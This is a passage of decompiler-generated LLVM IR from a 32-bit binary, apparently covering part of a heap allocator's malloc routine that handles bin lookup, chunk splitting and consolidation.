  %v3_80520aa = inttoptr i32 %v2_80520aa to i32*
  store i32 %v0_80520aa, i32* %v3_80520aa, align 4
  br label %dec_label_pc_80520ad

dec_label_pc_80520ad:                             ; preds = %dec_label_pc_8052381, %dec_label_pc_805234b, %dec_label_pc_805206c, %dec_label_pc_805209b
  %v0_80520ad = load i32, i32* %edx.global-to-local, align 4
  %v1_80520ad = add i32 %v0_80520ad, 8
  store i32 %v1_80520ad, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052746

dec_label_pc_80520b5:                             ; preds = %dec_label_pc_8052078
  store i32 %v1_8052434, i32* @eax, align 4
  %v0_80520b9 = call i32 @__malloc_largebin_index()
  store i32 %v0_80520b9, i32* %eax.global-to-local, align 4
  %v3_80520be = and i8 %v0_8052031, 2
  %v4_80520be = icmp eq i8 %v3_80520be, 0
  %v6_80520be = zext i8 %v3_80520be to i32
  %v9_80520be = and i32 %v1_8052031, -256
  %v10_80520be = or i32 %v9_80520be, %v6_80520be
  store i32 %v10_80520be, i32* @ebx, align 4
  store i32 %v0_80520b9, i32* @ebp, align 4
  br i1 %v4_80520be, label %dec_label_pc_8052204, label %dec_label_pc_80520c9

dec_label_pc_80520c9:                             ; preds = %dec_label_pc_80520b5
  store i32 ptrtoint (i8* @global_var_805aa80.281 to i32), i32* %stack_var_-72, align 4
  %v2_80520ce = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_805aa80.281 to i32*))
  store i32 %v2_80520ce, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052204

dec_label_pc_80520d9:                             ; preds = %dec_label_pc_8052204, %dec_label_pc_805220f
  %v0_80520f8 = phi i32 [ %v0_805220f, %dec_label_pc_805220f ], [ %v0_805220f15, %dec_label_pc_8052204 ]
  store i32 %v0_80520f8, i32* %eax.global-to-local, align 4
  %v1_80520dd = add i32 %v0_80520f8, 4
  %v2_80520dd = inttoptr i32 %v1_80520dd to i32*
  %v3_80520dd = load i32, i32* %v2_80520dd, align 4
  store i32 %v3_80520dd, i32* %esi.global-to-local, align 4
  %v1_80520e0 = add i32 %v0_80520f8, 12
  %v2_80520e0 = inttoptr i32 %v1_80520e0 to i32*
  %v3_80520e0 = load i32, i32* %v2_80520e0, align 4
  store i32 %v3_80520e0, i32* %edx.global-to-local, align 4
  %v1_80520e3 = and i32 %v3_80520dd, -4
  store i32 %v1_80520e3, i32* %esi.global-to-local, align 4
  br i1 %v6_8052080, label %dec_label_pc_8052154, label %dec_label_pc_80520f0

dec_label_pc_80520f0:                             ; preds = %dec_label_pc_80520d9
  %v9_80520f0 = icmp eq i32 %v3_80520e0, 134589108
  %v1_80520f6 = icmp eq i1 %v9_80520f0, false
  br i1 %v1_80520f6, label %dec_label_pc_8052154, label %dec_label_pc_80520f8

dec_label_pc_80520f8:                             ; preds = %dec_label_pc_80520f0
  %v1_80520f8 = load i32, i32* @global_var_805aab0.284, align 16
  %v12_80520f8 = icmp eq i32 %v0_80520f8, %v1_80520f8
  %v1_80520fe = icmp eq i1 %v12_80520f8, false
  br i1 %v1_80520fe, label %dec_label_pc_8052154, label %dec_label_pc_8052100

dec_label_pc_8052100:                             ; preds = %dec_label_pc_80520f8
  %tmp147 = icmp ugt i32 %v1_80520e3, %v1_8052208
  br i1 %tmp147, label %dec_label_pc_8052106, label %dec_label_pc_8052154

dec_label_pc_8052106:                             ; preds = %dec_label_pc_8052100
  %v5_805210c = add i32 %v0_80520f8, %v1_8052434
  store i32 %v5_805210c, i32* %edx.global-to-local, align 4
  %v5_8052110 = sub i32 %v1_80520e3, %v1_8052434
  store i32 %v5_8052110, i32* %eax.global-to-local, align 4
  %v4_8052114 = or i32 %v1_8052434, 1
  store i32 %v0_80520f8, i32* @ebx, align 4
  store i32 %v5_805210c, i32* @global_var_805aab0.284, align 16
  store i32 %v5_805210c, i32* @global_var_805aabc.285, align 4
  store i32 %v4_8052114, i32* %v2_80520dd, align 4
  %v0_8052130 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052132 = or i32 %v0_8052130, 1
  store i32 %v1_8052132, i32* @ecx, align 4
  %v0_8052135 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8052135, i32* @global_var_805aac0.286, align 64
  %v1_805213b = add i32 %v0_8052135, 8
  %v2_805213b = inttoptr i32 %v1_805213b to i32*
  store i32 ptrtoint (i32* @global_var_805aab4.287 to i32), i32* %v2_805213b, align 4
  %v0_8052142 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052142 = add i32 %v0_8052142, 12
  %v2_8052142 = inttoptr i32 %v1_8052142 to i32*
  store i32 ptrtoint (i32* @global_var_805aab4.287 to i32), i32* %v2_8052142, align 4
  %v0_8052149 = load i32, i32* @ecx, align 4
  %v1_8052149 = load i32, i32* %edx.global-to-local, align 4
  %v2_8052149 = add i32 %v1_8052149, 4
  %v3_8052149 = inttoptr i32 %v2_8052149 to i32*
  store i32 %v0_8052149, i32* %v3_8052149, align 4
  %v0_805214c = load i32, i32* %eax.global-to-local, align 4
  %v1_805214c = load i32, i32* %edx.global-to-local, align 4
  %v3_805214c = add i32 %v1_805214c, %v0_805214c
  %v4_805214c = inttoptr i32 %v3_805214c to i32*
  store i32 %v0_805214c, i32* %v4_805214c, align 4
  br label %dec_label_pc_80523d5

dec_label_pc_8052154:                             ; preds = %dec_label_pc_8052100, %dec_label_pc_80520f8, %dec_label_pc_80520f0, %dec_label_pc_80520d9
  store i32 ptrtoint (i32* @global_var_805aab4.287 to i32), i32* %eax.global-to-local, align 4
  %v15_8052159 = icmp eq i32 %v1_80520e3, %v1_8052434
  store i32 %v3_80520e0, i32* @global_var_805aac0.286, align 4
  %v2_8052160 = add i32 %v3_80520e0, 8
  %v3_8052160 = inttoptr i32 %v2_8052160 to i32*
  store i32 ptrtoint (i32* @global_var_805aab4.287 to i32), i32* %v3_8052160, align 4
  %v1_8052163 = icmp eq i1 %v15_8052159, false
  br i1 %v1_8052163, label %dec_label_pc_8052179, label %dec_label_pc_8052165

dec_label_pc_8052165:                             ; preds = %dec_label_pc_8052154
  store i32 %v0_80520f8, i32* %eax.global-to-local, align 4
  store i32 %v1_8052434, i32* %edx.global-to-local, align 4
  store i32 %v0_80520f8, i32* @ebx, align 4
  %v3_805216f = add i32 %v1_80520dd, %v1_8052434
  %v4_805216f = inttoptr i32 %v3_805216f to i32*
  %v5_805216f = load i32, i32* %v4_805216f, align 4
  %v6_805216f = or i32 %v5_805216f, 1
  store i32 %v6_805216f, i32* %v4_805216f, align 4
  br label %dec_label_pc_80523d5

dec_label_pc_8052179:                             ; preds = %dec_label_pc_8052154
  %v0_8052179 = load i32, i32* %esi.global-to-local, align 4
  %v6_805217f = icmp ugt i32 %v0_8052179, 255
  br i1 %v6_805217f, label %dec_label_pc_8052195, label %dec_label_pc_8052181

dec_label_pc_8052181:                             ; preds = %dec_label_pc_8052179
  %v2_8052183 = udiv i32 %v0_8052179, 8
  %v1_8052186 = mul nuw i32 %v2_8052183, 8
  %v2_8052186 = add i32 %v1_8052186, 134589100
  store i32 %v2_8052186, i32* %ecx.global-to-local, align 4
  store i32 %v2_8052186, i32* %stack_var_-68, align 4
  %v1_8052190 = add i32 %v1_8052186, 134589108
  %v2_8052190 = inttoptr i32 %v1_8052190 to i32*
  %v3_8052190 = load i32, i32* %v2_8052190, align 4
  store i32 %v3_8052190, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80521d7

dec_label_pc_8052195:                             ; preds = %dec_label_pc_8052179
  store i32 %v0_8052179, i32* @eax, align 4
  %v0_8052197 = call i32 @__malloc_largebin_index()
  %v1_805219e = mul i32 %v0_8052197, 8
  %v2_805219e = add i32 %v1_805219e, ptrtoint (i32* @global_var_805aaac.283 to i32)
  store i32 %v2_805219e, i32* %ebx.global-to-local, align 4
  store i32 %v2_805219e, i32* %eax.global-to-local, align 4
  store i32 %v2_805219e, i32* %stack_var_-68, align 4
  %v1_80521aa = add i32 %v1_805219e, add (i32 ptrtoint (i32* @global_var_805aaac.283 to i32), i32 8)
  %v2_80521aa = inttoptr i32 %v1_80521aa to i32*
  %v3_80521aa = load i32, i32* %v2_80521aa, align 4
  store i32 %v3_80521aa, i32* %ebx.global-to-local, align 4
  %v12_80521ad = icmp eq i32 %v3_80521aa, %v2_805219e
  br i1 %v12_80521ad, label %dec_label_pc_80521d7, label %dec_label_pc_80521b1

dec_label_pc_80521b1:                             ; preds = %dec_label_pc_8052195
  store i32 %v2_805219e, i32* %edx.global-to-local, align 4
  %v1_80521b3 = add i32 %v1_805219e, add (i32 ptrtoint (i32* @global_var_805aaac.283 to i32), i32 12)
  %v2_80521b3 = inttoptr i32 %v1_80521b3 to i32*
  %v3_80521b3 = load i32, i32* %v2_80521b3, align 4
  store i32 %v3_80521b3, i32* %eax.global-to-local, align 4
  %v0_80521b6 = load i32, i32* %esi.global-to-local, align 4
  %v2_80521b6 = add i32 %v3_80521b3, 4
  %v3_80521b6 = inttoptr i32 %v2_80521b6 to i32*
  %v4_80521b6 = load i32, i32* %v3_80521b6, align 4
  %v10_80521b6 = icmp ult i32 %v0_80521b6, %v4_80521b6
  %v1_80521b9 = icmp eq i1 %v10_80521b6, false
  br i1 %v1_80521b9, label %dec_label_pc_80521c2, label %dec_label_pc_80521bb

dec_label_pc_80521bb:                             ; preds = %dec_label_pc_80521b1
  store i32 %v2_805219e, i32* %ebx.global-to-local, align 4
  store i32 %v3_80521b3, i32* %stack_var_-68, align 4
  br label %dec_label_pc_80521d7

dec_label_pc_80521c2:                             ; preds = %dec_label_pc_80521b1
  %v1_80521c4 = or i32 %v0_80521b6, 1
  store i32 %v1_80521c4, i32* %eax.global-to-local, align 4
  %v2_80521cc122 = add i32 %v3_80521aa, 4
  %v3_80521cc123 = inttoptr i32 %v2_80521cc122 to i32*
  %v4_80521cc124 = load i32, i32* %v3_80521cc123, align 4
  %v10_80521cc125 = icmp ult i32 %v1_80521c4, %v4_80521cc124
  br i1 %v10_80521cc125, label %dec_label_pc_80521c9, label %dec_label_pc_80521d1

dec_label_pc_80521c9:                             ; preds = %dec_label_pc_80521c2, %dec_label_pc_80521c9
  %v1_80521cc126 = phi i32 [ %v3_80521c9, %dec_label_pc_80521c9 ], [ %v3_80521aa, %dec_label_pc_80521c2 ]
  %v1_80521c9 = add i32 %v1_80521cc126, 8
  %v2_80521c9 = inttoptr i32 %v1_80521c9 to i32*
  %v3_80521c9 = load i32, i32* %v2_80521c9, align 4
  store i32 %v3_80521c9, i32* %ebx.global-to-local, align 4
  %v2_80521cc = add i32 %v3_80521c9, 4
  %v3_80521cc = inttoptr i32 %v2_80521cc to i32*
  %v4_80521cc = load i32, i32* %v3_80521cc, align 4
  %v10_80521cc = icmp ult i32 %v1_80521c4, %v4_80521cc
  br i1 %v10_80521cc, label %dec_label_pc_80521c9, label %dec_label_pc_80521d1

dec_label_pc_80521d1:                             ; preds = %dec_label_pc_80521c9, %dec_label_pc_80521c2
  %v1_80521cc.lcssa = phi i32 [ %v3_80521aa, %dec_label_pc_80521c2 ], [ %v3_80521c9, %dec_label_pc_80521c9 ]
  %v1_80521d1 = add i32 %v1_80521cc.lcssa, 12
  %v2_80521d1 = inttoptr i32 %v1_80521d1 to i32*
  %v3_80521d1 = load i32, i32* %v2_80521d1, align 4
  store i32 %v3_80521d1, i32* %ecx.global-to-local, align 4
  store i32 %v3_80521d1, i32* %stack_var_-68, align 4
  br label %dec_label_pc_80521d7

dec_label_pc_80521d7:                             ; preds = %dec_label_pc_8052195, %dec_label_pc_80521bb, %dec_label_pc_8052181, %dec_label_pc_80521d1
  %v0_80521d7 = phi i32 [ %v0_8052197, %dec_label_pc_8052195 ], [ %v0_8052197, %dec_label_pc_80521bb ], [ %v2_8052183, %dec_label_pc_8052181 ], [ %v0_8052197, %dec_label_pc_80521d1 ]
  %v1_80521d9 = urem i32 %v0_80521d7, 32
  %v2_80521d9 = icmp eq i32 %v1_80521d9, 0
  %v2_80521dc = sdiv i32 %v0_80521d7, 32
  store i32 %v2_80521dc, i32* %edx.global-to-local, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  store i32 %v1_80521d9, i32* @ecx, align 4
  br i1 %v2_80521d9, label %dec_label_pc_805220f, label %bb

bb:                                               ; preds = %dec_label_pc_80521d7
  %v5_80521e6 = shl i32 1, %v1_80521d9
  store i32 %v5_80521e6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805220f

dec_label_pc_805220f:                             ; preds = %dec_label_pc_80521d7, %bb
  %v5_80521e8 = phi i32 [ 1, %dec_label_pc_80521d7 ], [ %v5_80521e6, %bb ]
  %v1_80521e8 = mul nsw i32 %v2_80521dc, 4
  %v2_80521e8 = add i32 %v1_80521e8, ptrtoint (i32* @global_var_805adb4.288 to i32)
  %v3_80521e8 = inttoptr i32 %v2_80521e8 to i32*
  %v4_80521e8 = load i32, i32* %v3_80521e8, align 4
  %v6_80521e8 = or i32 %v4_80521e8, %v5_80521e8
  store i32 %v6_80521e8, i32* %v3_80521e8, align 4
  store i32 %v0_80520f8, i32* %eax.global-to-local, align 4
  %v2_80521f3 = load i32, i32* %stack_var_-68, align 4
  store i32 %v2_80521f3, i32* %edx.global-to-local, align 4
  %v0_80521f6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80521f6 = add i32 %v0_80520f8, 8
  %v3_80521f6 = inttoptr i32 %v2_80521f6 to i32*
  store i32 %v0_80521f6, i32* %v3_80521f6, align 4
  %v0_80521f9 = load i32, i32* %edx.global-to-local, align 4
  %v1_80521f9 = load i32, i32* %eax.global-to-local, align 4
  %v2_80521f9 = add i32 %v1_80521f9, 12
  %v3_80521f9 = inttoptr i32 %v2_80521f9 to i32*
  store i32 %v0_80521f9, i32* %v3_80521f9, align 4
  %v0_80521fc = load i32, i32* %eax.global-to-local, align 4
  %v1_80521fc = load i32, i32* %ebx.global-to-local, align 4
  %v2_80521fc = add i32 %v1_80521fc, 12
  %v3_80521fc = inttoptr i32 %v2_80521fc to i32*
  store i32 %v0_80521fc, i32* %v3_80521fc, align 4
  %v0_80521ff = load i32, i32* %eax.global-to-local, align 4
  %v1_80521ff = load i32, i32* %edx.global-to-local, align 4
  %v2_80521ff = add i32 %v1_80521ff, 8
  %v3_80521ff = inttoptr i32 %v2_80521ff to i32*
  store i32 %v0_80521ff, i32* %v3_80521ff, align 4
  %v0_805220f = load i32, i32* @global_var_805aac0.286, align 64
  %v9_8052219 = icmp eq i32 %v0_805220f, 134589108
  %v1_805221f = icmp eq i1 %v9_8052219, false
  br i1 %v1_805221f, label %dec_label_pc_80520d9, label %dec_label_pc_8052225

dec_label_pc_8052204:                             ; preds = %dec_label_pc_80520b5, %dec_label_pc_8052082, %dec_label_pc_80520c9
  %v1_8052208 = add i32 %v1_8052434, 16
  store i32 %v1_8052208, i32* @ecx, align 4
  %v0_805220f15 = load i32, i32* @global_var_805aac0.286, align 64
  %v9_805221921 = icmp eq i32 %v0_805220f15, 134589108
  %v1_805221f23 = icmp eq i1 %v9_805221921, false
  br i1 %v1_805221f23, label %dec_label_pc_80520d9, label %dec_label_pc_8052225

dec_label_pc_8052225:                             ; preds = %dec_label_pc_805220f, %dec_label_pc_8052204
  %v0_805220f.lcssa = phi i32 [ %v0_805220f15, %dec_label_pc_8052204 ], [ %v0_805220f, %dec_label_pc_805220f ]
  %v0_80522be.pre = load i32, i32* @ebp, align 4
  br i1 %v8_8052078, label %dec_label_pc_80522be, label %dec_label_pc_8052233

dec_label_pc_8052233:                             ; preds = %dec_label_pc_8052225
  %v1_8052233 = mul i32 %v0_80522be.pre, 8
  %v2_8052233 = add i32 %v1_8052233, ptrtoint (i32* @global_var_805aaac.283 to i32)
  store i32 %v2_8052233, i32* %edx.global-to-local, align 4
  %v1_805223a = add i32 %v1_8052233, add (i32 ptrtoint (i32* @global_var_805aaac.283 to i32), i32 12)
  %v2_805223a = inttoptr i32 %v1_805223a to i32*
  %storemerge2.pre = load i32, i32* %v2_805223a, align 4
  br label %dec_label_pc_80522ba

dec_label_pc_805223f:                             ; preds = %dec_label_pc_80522ba
  %v1_805223f = add i32 %v4_8052256, 4
  %v2_805223f = inttoptr i32 %v1_805223f to i32*
  %v3_805223f = load i32, i32* %v2_805223f, align 4
  store i32 %v3_805223f, i32* %ebx.global-to-local, align 4
  %v1_8052242 = add i32 %v4_8052256, 12
  %v2_8052242 = inttoptr i32 %v1_8052242 to i32*
  %v3_8052242 = load i32, i32* %v2_8052242, align 4
  store i32 %v3_8052242, i32* %ecx.global-to-local, align 4
  %v1_8052245 = and i32 %v3_805223f, -4
  store i32 %v1_8052245, i32* %ebx.global-to-local, align 4
  %v10_8052248 = icmp ult i32 %v1_8052245, %v1_8052434
  br i1 %v10_8052248, label %dec_label_pc_80522ba, label %dec_label_pc_805224e

dec_label_pc_805224e:                             ; preds = %dec_label_pc_805223f
  %v1_805224e = add i32 %v4_8052256, 8
  %v2_805224e = inttoptr i32 %v1_805224e to i32*
  %v3_805224e = load i32, i32* %v2_805224e, align 4
  store i32 %v3_805224e, i32* %edx.global-to-local, align 4
  %v1_8052251 = add i32 %v3_805224e, 12
  %v2_8052251 = inttoptr i32 %v1_8052251 to i32*
  %v3_8052251 = load i32, i32* %v2_8052251, align 4
  %v15_8052251 = icmp eq i32 %v3_8052251, %v4_8052256
  %v1_8052254 = icmp eq i1 %v15_8052251, false
  br i1 %v1_8052254, label %dec_label_pc_805225b, label %dec_label_pc_8052256

dec_label_pc_8052256:                             ; preds = %dec_label_pc_805224e
  %v1_8052256 = add i32 %v3_8052242, 8
  %v2_8052256 = inttoptr i32 %v1_8052256 to i32*
  %v3_8052256 = load i32, i32* %v2_8052256, align 4
  %v15_8052256 = icmp eq i32 %v3_8052256, %v4_8052256
  br i1 %v15_8052256, label %dec_label_pc_8052260, label %dec_label_pc_805225b

dec_label_pc_805225b:                             ; preds = %dec_label_pc_8052256, %dec_label_pc_805224e
  %v0_805225b = call i32 @abort()
  store i32 %v0_805225b, i32* %eax.global-to-local, align 4
  %v0_8052260.pre = load i32, i32* @ebx, align 4
  %v0_8052262.pre = load i32, i32* @ecx, align 4
  %v1_8052262.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8052260

dec_label_pc_8052260:                             ; preds = %dec_label_pc_8052256, %dec_label_pc_805225b
  %v1_8052262 = phi i32 [ %v3_805224e, %dec_label_pc_8052256 ], [ %v1_8052262.pre, %dec_label_pc_805225b ]
  %v0_8052262 = phi i32 [ %v3_8052242, %dec_label_pc_8052256 ], [ %v0_8052262.pre, %dec_label_pc_805225b ]
  %v0_8052260 = phi i32 [ %v1_8052245, %dec_label_pc_8052256 ], [ %v0_8052260.pre, %dec_label_pc_805225b ]
  store i32 %v0_8052260, i32* %esi.global-to-local, align 4
  %v2_8052262 = add i32 %v1_8052262, 12
  %v3_8052262 = inttoptr i32 %v2_8052262 to i32*
  store i32 %v0_8052262, i32* %v3_8052262, align 4
  %v0_8052265 = load i32, i32* %esi.global-to-local, align 4
  %v5_8052265 = sub i32 %v0_8052265, %v1_8052434
  store i32 %v5_8052265, i32* %esi.global-to-local, align 4
  %v0_8052269 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052269 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8052269 = add i32 %v1_8052269, 8
  %v3_8052269 = inttoptr i32 %v2_8052269 to i32*
  store i32 %v0_8052269, i32* %v3_8052269, align 4
  %v0_805226c = load i32, i32* %esi.global-to-local, align 4
  %v0_805226f = load i32, i32* %eax.global-to-local, align 4
  %v1_805226f = add i32 %v0_805226f, 8
  store i32 %v1_805226f, i32* @ecx, align 4
  %v6_8052272 = icmp ugt i32 %v0_805226c, 15
  br i1 %v6_8052272, label %dec_label_pc_805227b, label %dec_label_pc_8052274

dec_label_pc_8052274:                             ; preds = %dec_label_pc_8052260
  %v0_8052274 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052274 = add i32 %v0_805226f, 4
  %v3_8052274 = add i32 %v2_8052274, %v0_8052274
  %v4_8052274 = inttoptr i32 %v3_8052274 to i32*
  %v5_8052274 = load i32, i32* %v4_8052274, align 4
  %v6_8052274 = or i32 %v5_8052274, 1
  store i32 %v6_8052274, i32* %v4_8052274, align 4
  br label %dec_label_pc_80522b1

dec_label_pc_805227b:                             ; preds = %dec_label_pc_8052260
  %v4_805227f = or i32 %v1_8052434, 1
  %v2_8052284 = add i32 %v0_805226f, %v1_8052434
  store i32 %v2_8052284, i32* %edx.global-to-local, align 4
  store i32 %v0_805220f.lcssa, i32* %ebx.global-to-local, align 4
  %v2_805228b = add i32 %v0_805220f.lcssa, 8
  %v3_805228b = inttoptr i32 %v2_805228b to i32*
  store i32 %v2_8052284, i32* %v3_805228b, align 4
  %v0_805228e = load i32, i32* %edx.global-to-local, align 4
  %v1_805228e = load i32, i32* %ebx.global-to-local, align 4
  %v2_805228e = add i32 %v1_805228e, 12
  %v3_805228e = inttoptr i32 %v2_805228e to i32*
  store i32 %v0_805228e, i32* %v3_805228e, align 4
  store i32 %v4_805227f, i32* %ebx.global-to-local, align 4
  %v0_8052295 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052295 = add i32 %v0_8052295, 8
  %v2_8052295 = inttoptr i32 %v1_8052295 to i32*
  store i32 ptrtoint (i32* @global_var_805aab4.287 to i32), i32* %v2_8052295, align 4
  %v0_805229c = load i32, i32* %ebx.global-to-local, align 4
  %v1_805229c = load i32, i32* %eax.global-to-local, align 4
  %v2_805229c = add i32 %v1_805229c, 4
  %v3_805229c = inttoptr i32 %v2_805229c to i32*
  store i32 %v0_805229c, i32* %v3_805229c, align 4
  %v0_805229f = load i32, i32* %esi.global-to-local, align 4
  %v1_80522a1 = or i32 %v0_805229f, 1
  store i32 %v1_80522a1, i32* %eax.global-to-local, align 4
  %v0_80522a4 = load i32, i32* %edx.global-to-local, align 4
  %v1_80522a4 = add i32 %v0_80522a4, 12
  %v2_80522a4 = inttoptr i32 %v1_80522a4 to i32*
  store i32 ptrtoint (i32* @global_var_805aab4.287 to i32), i32* %v2_80522a4, align 4
  %v0_80522ab = load i32, i32* %eax.global-to-local, align 4
  %v1_80522ab = load i32, i32* %edx.global-to-local, align 4
  %v2_80522ab = add i32 %v1_80522ab, 4
  %v3_80522ab = inttoptr i32 %v2_80522ab to i32*
  store i32 %v0_80522ab, i32* %v3_80522ab, align 4
  %v0_80522ae = load i32, i32* %esi.global-to-local, align 4
  %v1_80522ae = load i32, i32* %edx.global-to-local, align 4
  %v3_80522ae = add i32 %v1_80522ae, %v0_80522ae
  %v4_80522ae = inttoptr i32 %v3_80522ae to i32*
  store i32 %v0_80522ae, i32* %v4_80522ae, align 4
  br label %dec_label_pc_80522b1

dec_label_pc_80522b1:                             ; preds = %dec_label_pc_8052274, %dec_label_pc_805227b
  %v0_80522b1 = load i32, i32* @ecx, align 4
  store i32 %v0_80522b1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052746

dec_label_pc_80522ba:                             ; preds = %dec_label_pc_805223f, %dec_label_pc_8052233
  %v4_8052256 = phi i32 [ %storemerge2.pre, %dec_label_pc_8052233 ], [ %v3_8052242, %dec_label_pc_805223f ]
  store i32 %v4_8052256, i32* %eax.global-to-local, align 4
  %v12_80522ba = icmp eq i32 %v4_8052256, %v2_8052233
  %v1_80522bc = icmp eq i1 %v12_80522ba, false
  br i1 %v1_80522bc, label %dec_label_pc_805223f, label %dec_label_pc_80522be.loopexit

dec_label_pc_80522be.loopexit:                    ; preds = %dec_label_pc_80522ba
  br label %dec_label_pc_80522be

dec_label_pc_80522be:                             ; preds = %dec_label_pc_8052225, %dec_label_pc_80522be.loopexit
  %v1_80522be = add i32 %v0_80522be.pre, 1
  store i32 1, i32* @edi, align 4
  %v2_80522c8 = udiv i32 %v1_80522be, 32
  store i32 %v2_80522c8, i32* @ebp, align 4
  %v1_80522cb = mul i32 %v1_80522be, 8
  %v2_80522cb = add i32 %v1_80522cb, ptrtoint (i32* @global_var_805aaac.283 to i32)
  store i32 %v2_80522cb, i32* %ebx.global-to-local, align 4
  %v1_80522d2 = urem i32 %v1_80522be, 32
  %v2_80522d2 = icmp eq i32 %v1_80522d2, 0
  store i32 %v1_80522d2, i32* %ecx.global-to-local, align 4
  %v1_80522d5 = mul nuw nsw i32 %v2_80522c8, 4
  %v2_80522d5 = add i32 %v1_80522d5, ptrtoint (i32* @global_var_805adb4.288 to i32)
  %v3_80522d5 = inttoptr i32 %v2_80522d5 to i32*
  %v4_80522d5 = load i32, i32* %v3_80522d5, align 4
  store i32 %v4_80522d5, i32* @esi, align 4
  br i1 %v2_80522d2, label %.preheader, label %bb100

bb100:                                            ; preds = %dec_label_pc_80522be
  %v5_80522dc = shl i32 1, %v1_80522d2
  store i32 %v5_80522dc, i32* @edi, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_80522be, %bb100, %dec_label_pc_805231d
  %v1_80522de = phi i32 [ %v1_80522de.pre, %dec_label_pc_805231d ], [ %v4_80522d5, %bb100 ], [ %v4_80522d5, %dec_label_pc_80522be ]
  %v0_80522e2 = phi i32 [ %v0_80522de.pre, %dec_label_pc_805231d ], [ %v5_80522dc, %bb100 ], [ 1, %dec_label_pc_80522be ]
  %tmp101 = icmp ule i32 %v0_80522e2, %v1_80522de
  %v1_80522e2 = icmp eq i32 %v0_80522e2, 0
  %v1_80522e4 = icmp eq i1 %v1_80522e2, false
  %or.cond = and i1 %tmp101, %v1_80522e4
  br i1 %or.cond, label %dec_label_pc_80522e2.dec_label_pc_8052312.preheader_crit_edge, label %dec_label_pc_80522e6.preheader

dec_label_pc_80522e2.dec_label_pc_8052312.preheader_crit_edge: ; preds = %.preheader
  %v0_805230d13.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052312.preheader

dec_label_pc_80522e6.preheader:                   ; preds = %.preheader
  %v0_80522e6.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_80522e6

dec_label_pc_80522e6:                             ; preds = %dec_label_pc_80522e6.preheader, %dec_label_pc_80522f0
  %v0_80522e6 = phi i32 [ %v0_80522e6.pre, %dec_label_pc_80522e6.preheader ], [ %v1_80522e6, %dec_label_pc_80522f0 ]
  %v1_80522e6 = add i32 %v0_80522e6, 1
  store i32 %v1_80522e6, i32* @ebp, align 4
  %v6_80522ea = icmp ugt i32 %v1_80522e6, 2
  br i1 %v6_80522ea, label %dec_label_pc_805239d.loopexit, label %dec_label_pc_80522f0

dec_label_pc_80522f0:                             ; preds = %dec_label_pc_80522e6
  %v1_80522f0 = mul i32 %v1_80522e6, 4
  %v2_80522f0 = add i32 %v1_80522f0, ptrtoint (i32* @global_var_805adb4.288 to i32)
  %v3_80522f0 = inttoptr i32 %v2_80522f0 to i32*
  %v4_80522f0 = load i32, i32* %v3_80522f0, align 4
  store i32 %v4_80522f0, i32* @esi, align 4
  %v1_80522f7 = icmp eq i32 %v4_80522f0, 0
  br i1 %v1_80522f7, label %dec_label_pc_80522e6, label %dec_label_pc_80522fb

dec_label_pc_80522fb:                             ; preds = %dec_label_pc_80522f0
  %v2_8052302 = mul i32 %v1_80522e6, 256
  store i32 %v2_8052302, i32* %eax.global-to-local, align 4
  %v1_8052305 = add i32 %v2_8052302, ptrtoint (i32* @global_var_805aaac.283 to i32)
  store i32 %v1_8052305, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052312.preheader

dec_label_pc_8052312.preheader:                   ; preds = %dec_label_pc_80522e2.dec_label_pc_8052312.preheader_crit_edge, %dec_label_pc_80522fb
  %v0_805230d13 = phi i32 [ %v1_8052305, %dec_label_pc_80522fb ], [ %v0_805230d13.pre, %dec_label_pc_80522e2.dec_label_pc_8052312.preheader_crit_edge ]
  %v0_8052324 = phi i32 [ %v4_80522f0, %dec_label_pc_80522fb ], [ %v1_80522de, %dec_label_pc_80522e2.dec_label_pc_8052312.preheader_crit_edge ]
  %edi.promoted = phi i32 [ 1, %dec_label_pc_80522fb ], [ %v0_80522e2, %dec_label_pc_80522e2.dec_label_pc_8052312.preheader_crit_edge ]
  %v2_805231210 = and i32 %edi.promoted, %v0_8052324
  %v3_805231211 = icmp eq i32 %v2_805231210, 0
  br i1 %v3_805231211, label %dec_label_pc_805230d, label %dec_label_pc_8052316

dec_label_pc_805230d:                             ; preds = %dec_label_pc_8052312.preheader, %dec_label_pc_805230d
  %v2_805231026 = phi i32 [ %v2_8052310, %dec_label_pc_805230d ], [ %edi.promoted, %dec_label_pc_8052312.preheader ]
  %v0_805230d14 = phi i32 [ %v1_805230d, %dec_label_pc_805230d ], [ %v0_805230d13, %dec_label_pc_8052312.preheader ]
  %v1_805230d = add i32 %v0_805230d14, 8
  %v2_8052310 = mul i32 %v2_805231026, 2
  %v2_8052312 = and i32 %v2_8052310, %v0_8052324
  %v3_8052312 = icmp eq i32 %v2_8052312, 0
  br i1 %v3_8052312, label %dec_label_pc_805230d, label %dec_label_pc_8052312.dec_label_pc_8052316_crit_edge

dec_label_pc_8052312.dec_label_pc_8052316_crit_edge: ; preds = %dec_label_pc_805230d
  store i32 %v1_805230d, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052316

dec_label_pc_8052316:                             ; preds = %dec_label_pc_8052312.dec_label_pc_8052316_crit_edge, %dec_label_pc_8052312.preheader
  %v0_8052326 = phi i32 [ %v2_8052310, %dec_label_pc_8052312.dec_label_pc_8052316_crit_edge ], [ %edi.promoted, %dec_label_pc_8052312.preheader ]
  %v1_805233a = phi i32 [ %v1_805230d, %dec_label_pc_8052312.dec_label_pc_8052316_crit_edge ], [ %v0_805230d13, %dec_label_pc_8052312.preheader ]
  %v1_8052316 = add i32 %v1_805233a, 12
  %v2_8052316 = inttoptr i32 %v1_8052316 to i32*
